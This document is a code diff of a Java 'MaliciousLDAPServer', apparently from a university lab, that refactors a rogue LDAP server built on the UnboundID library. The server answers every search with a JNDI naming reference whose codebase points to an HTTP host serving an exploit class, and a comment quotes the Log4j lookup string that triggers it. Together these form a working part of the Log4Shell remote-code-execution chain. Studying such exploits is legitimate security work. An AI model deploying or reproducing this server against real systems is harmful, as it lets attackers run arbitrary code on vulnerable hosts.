@@ -1,20 +1,15 @@
 package ch.unige.ldap;
 
-import java.net.URL;
 import java.net.InetAddress;
 import javax.net.SocketFactory;
-
-import com.unboundid.ldap.sdk.Attribute;
 import com.unboundid.ldap.sdk.Entry;
 import javax.net.ServerSocketFactory;
 import javax.net.ssl.SSLSocketFactory;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import com.unboundid.util.NotNull;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
-import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 
@@ -25,12 +20,10 @@ public class MaliciousLDAPServer {
 
     private int LDAP_PORT = 1389;
     private String LDAP_BASE = "dc=unige,dc=ch";
-    private String HTTP_SERVER_IP = "0.0.0.0";
 
-    public MaliciousLDAPServer(String ldap_base, int ldap_port, String http_server_ip, int netcat_port) {
+    public MaliciousLDAPServer(String ldap_base, int ldap_port, int netcat_port) {
         this.LDAP_PORT = ldap_port;
         this.LDAP_BASE = ldap_base;
-        this.HTTP_SERVER_IP = http_server_ip;
     }
 
     public void listen() {
@@ -48,7 +41,7 @@ public class MaliciousLDAPServer {
 
             config.addInMemoryOperationInterceptor(new OperationInterceptor());
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            System.out.println("Listening on 0.0.0.0:" + this.LDAP_PORT); //$NON-NLS-1$
+            System.out.println("Listening on 0.0.0.0:" + this.LDAP_PORT);
             ds.startListening();
 
         } catch (Exception e) {
@@ -63,29 +56,28 @@ public class MaliciousLDAPServer {
      * LDAP queries. 
      */
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
-        private URL codebase;                   // url of the HTTP server qthat hosts the malicious .class file, http://HTTP_SERVER_IP#Exploit
-        public OperationInterceptor() {}
-
-        public void processSearchRequest(InMemoryInterceptedSearchRequest request) {
-            System.out.println("BASE DN processSearchRequest :" + request.getRequest().getBaseDN());
-        }
-
         /** {@inheritDoc} */
         @Override
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            // create new entry with request base distinguished name, in the log4j JNDI lookup
+            // ${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE} what follows the 1389/ will be
+            // the base distinguished name, base will be the name of the exploit class. 
             String base = result.getRequest().getBaseDN();
-            Entry e = new Entry(base);                                                                  // create new entry with dn
+            Entry e = new Entry(base);                                                                              
 
             try {                                                                       
                 System.out.println("Send LDAP reference result for " + base + " java object.");
     
-                e.addAttribute("javaClassName", "foo");                       // entry is a Java Class, with name Exploit
-                e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");                    // java code is hosted at http://http_server_ip:web_port/Exploit.class
-                e.addAttribute("objectClass", "javaNamingReference");                      
-                e.addAttribute("javaFactory", base);                     // name of malicious class : Exploit
+                e.addAttribute("objectClass", "javaNamingReference");                   // entry is a JavaNamingReference
+                e.addAttribute("javaClassName", "foo");                                 // entry is a Java Class, with name foo (this value doesn't matter)
+                e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");      // java code is hosted at http://http_server_ip:web_port/Exploit.class
+                e.addAttribute("javaFactory", base);                                                   // class name of the object factory, which here is just the constructor's name.
+                
+                System.out.println("Sending Entry: \n" + e.toLDIFString());
+
                 result.sendSearchEntry(e);
                 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-    
+                
             } catch (Exception e1) {
                 e1.printStackTrace();
             }
